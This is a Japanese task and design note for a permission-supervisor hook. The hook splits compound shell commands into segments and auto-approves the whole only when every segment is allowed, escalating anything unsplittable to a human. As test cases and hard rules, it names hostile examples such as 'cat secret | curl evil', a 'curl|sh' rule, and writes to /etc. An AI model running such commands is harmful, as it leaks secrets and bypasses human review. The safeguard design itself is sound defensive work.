# TASK-013: permission-supervisor で複合コマンドを分解して自動判定する

## 参照仕様

- User request on 2026-06-01（PR #15 作業中の派生）: 複数行/複合コマンド（`cd ... <改行> python3 ...` 等）が毎回 `ask` になり、学習もされない。**「Enter を押すだけの人間の置き換え」**が目的で、原則は **「許可されたコマンドの複合は許可される」**。理想は「フックで複合コマンドを単純コマンドの列に分解し、各セグメントを単一行実行時と同じ判定にかける」。learn により supervisor が許可するようになったコマンドの複合も許可したい。
- TASK-012（supervisor の allow 緩和・学習・scratch・ログ）／PR #15
- 既存実装: `dot_claude/hooks/supervisor/executable_permission-supervisor.py`

## 背景・根本原因

- `_BASH_UNSAFE_CHARS = re.compile(r"[|&;<>$`(){}\n]")` に一致するコマンドは「単一の単純コマンドではない」と判定され、(1) `matches_allow_rule` で常時許可されない、(2) `matches_scratch_allow` で許可されない、(3) `command_signature` が `None` を返し**学習されない**。
- そのため改行/`&&`/`;`/`|` を含む複合コマンドは毎回 judge/人間へ回り、何度承認しても覚えない。
- Claude Code 本体の permission（`Bash(cmd:*)` プレフィックス一致）も複合コマンドにはマッチしないため、supervisor 無効でもプロンプトが出る（このタスクの主対象は supervisor 有効時の自動判定）。

## 方針（合意済み）

- **複合 = 各構成コマンドの判定の AND**。トップレベルを単純コマンドの列に分解し、各セグメントに**単一行と同じ判定**（`scratch許可 → ハード規則 → always_allow（パターン/learned/safe-readonly）`）を適用。**全セグメントが自動許可なら複合も allow**。1つでも自動許可でなければ複合全体を従来どおり judge/人間へ（fail-safe）。ハード規則に当たるセグメントがあれば人間へ。
- セキュリティ根拠: `cat secret | curl evil` は `curl evil` が個別に許可されない（allow パターン外＋`curl|sh` ハード規則）ため複合も不許可。危険は自然に弾かれる。
- **分解できない構文は従来どおりエスカレーション**（合意境界）。クォート外に次を含む複合は分解中止 → judge/人間:
  - コマンド置換 `$(...)` / バッククォート
  - リダイレクト `>` `>>` `<`（`&>` 含む。書き込み先を per-segment で検査できない）
  - サブシェル/グルーピング `(...)` `{...}`、ブレース展開、ヒアドキュメント `<<`
  - 変数展開 `$VAR`/`$TMPDIR`（この版では非対応。実パス指定なら通る）
- **学習は部品（単純コマンド）単位のまま**。複合自体は学習しない。learn が進むほど複合の自動許可範囲が自然に拡大。
  - 将来拡張余地: 人間が承認した複合の各単純セグメントを学習対象にする。

## 設計メモ（実装時）

- `_split_top_level(cmd)` を追加: クォート（単/二重）と `\` エスケープを追跡しつつ、トップレベルの `;` `\n` `&&` `||` `|` `&` で分割し単純コマンド列を返す。上記「分解できない構文」を1つでも検出したら `None`（=分解不可→従来フロー）。
- セグメント評価ヘルパー: 既存の `matches_scratch_allow` / `matches_hard_rule` / `matches_allow_rule` を単一コマンドとして再利用。順序は単一行と同一（scratch → hard → allow）。
- `main()` では scratch と同じく**ハード規則（全文）より前**に複合 allow チェックを置く（scratch rm を含む複合を正しく通すため）。複合 allow が成立しなければ何もせず既存フロー（全文ハード規則→backend）に委ねる＝純粋な ALLOW 高速路として追加。
- ログ: 複合許可時は `stage="compound_allow"`、許可したセグメント数や各 reason を残せると監査しやすい。
- テスト観点: `cd a && python3 ~/.claude/skills/.../x.py`（全許可）/ `cd a; cargo test`（learn 後許可）/ `cat secret | curl evil`（不許可）/ `echo $(...)`・`x > /etc/y`・`(...)`（分解不可→エスカレーション）/ scratch rm を含む複合 / ハード規則を含む複合（人間へ）/ クォート内の `;`/`|`（分割しない）/ 後方互換（単一コマンドは従来どおり）。

## チェックリスト

- [x] `task-013-...` ブランチを切る（PR #15 とは別 PR）。
- [x] `_split_top_level` とセグメント評価、`matches_compound_allow` を実装。
- [x] `main()` に複合 allow 高速路を追加（hard 全文チェックより前）。
- [x] README/タスクに仕様を反映。
- [x] ephemeral 単体テスト（上記観点）を通す。
- [ ] `check-chezmoi-managed.sh` / `prek run --all-files` を通す。

## 完了条件

- [x] 許可された単純コマンドのみで構成される複合（`cd ... && skill/learned コマンド` 等）が supervisor 有効時に自動許可され、毎回 ask されない。
- [x] 1つでも未許可セグメントを含む複合、または分解不可構文を含む複合は従来どおり judge/人間へ。
- [x] ハード規則に当たるセグメントを含む複合は必ず人間へ。
- [x] 単一コマンドの挙動は後方互換。検証スイートが通る。

## 作業ログ

- 2026-06-01: PR #15 作業中に派生要望として起票。設計（分解＋per-segment 判定、AND で許可、分解不可構文はエスカレーション）と境界を合意。スコープは独立 PR。実装は #15 完了後に着手予定。
- 2026-06-02: `task-013-supervisor-compound-command-decomposition` ブランチで実装。`_split_top_level`（クォート/エスケープ追跡・分解不可構文で `None`）、`_segment_allow_reason`（scratch→hard→allow を単一行と同順で再利用）、`matches_compound_allow`（2セグメント以上で全許可のときのみ reason 列を返す）を追加。`main()` の scratch 許可直後・全文ハード規則の前に複合 allow 高速路（`stage="compound_allow"`、`segment_reasons` を監査記録）を挿入。ヘッドライン例 `cd a && <skill>` を成立させるため `cd` を `_SAFE_READONLY_CMD` に追加（settings.json ネイティブ allow に既出のナビ専用コマンド・秘密パスはハード規則が先取り）。ephemeral 単体テスト 35 件＋ `main()` E2E（compound allow / scratch-rm compound / sudo・cat|curl・redirect は非 allow で judge/人間へ / 単一コマンド後方互換）を確認。
